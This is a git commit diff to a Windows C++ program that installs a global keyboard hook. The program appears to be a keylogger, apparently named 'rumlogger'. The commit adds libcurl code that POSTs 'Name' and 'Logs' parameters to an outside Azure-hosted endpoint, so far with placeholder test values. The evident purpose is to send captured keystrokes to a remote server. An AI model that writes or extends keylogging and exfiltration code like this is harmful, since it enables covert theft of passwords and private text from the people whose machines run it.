50eae11c17709c99d82b891786746f94a01390a7
Dominik Ruman <dr124@o2.pl>
2021-11-30 16:51:15 +0100

    send basic http(s) post

--- exe/main.cpp
+++ exe/main.cpp
@@ -1,11 +1,17 @@
+#define CURL_STATICLIB
 #define _WIN32_WINNT 0x0400
 #pragma comment( lib, "user32.lib" )
 
 #include <iostream>
 #include <Windows.h>
 #include <cstdio>
+#include <curl/curl.h>
+#include <string>
+
+using namespace std;
 
 HHOOK hKeyboardHook;
+CURL* curl;
 
 __declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -42,19 +48,29 @@ DWORD WINAPI my_HotKey(LPVOID lpParm)
 	return 0;
 }
 
+size_t writeFunction(void* ptr, size_t size, size_t nmemb, std::string* data) {
+	data->append((char*)ptr, size * nmemb);
+	return size * nmemb;
+}
+
+int work(int argc, char** argv)
+{
+	curl_easy_setopt(curl, CURLOPT_URL, "https://rumlogger.azurewebsites.net/api/User/AddUserData?Name=test3&Logs=test123");
+	curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "");
+	auto res = curl_easy_perform(curl);
+
+	return 0;
+}
+
+
 int main(int argc, char** argv)
 {
-	DWORD cchComputerName = MAX_COMPUTERNAME_LENGTH + 1;
-	char* computerName = new char[MAX_COMPUTERNAME_LENGTH + 1];
+	curl = curl_easy_init();
 
-	GetComputerNameA(computerName, &cchComputerName);
+	auto ret = work(argc, argv);
 
-	return -1;
-	DWORD threadId;
+	curl_easy_cleanup(curl);
+	curl = nullptr;
 
-	const auto threadHandle = CreateThread(nullptr, NULL, my_HotKey, argv[0], NULL, &threadId);
-
-	return threadHandle
-		? WaitForSingleObject(threadHandle, INFINITE)
-		: 2137;
+	return ret;
 }
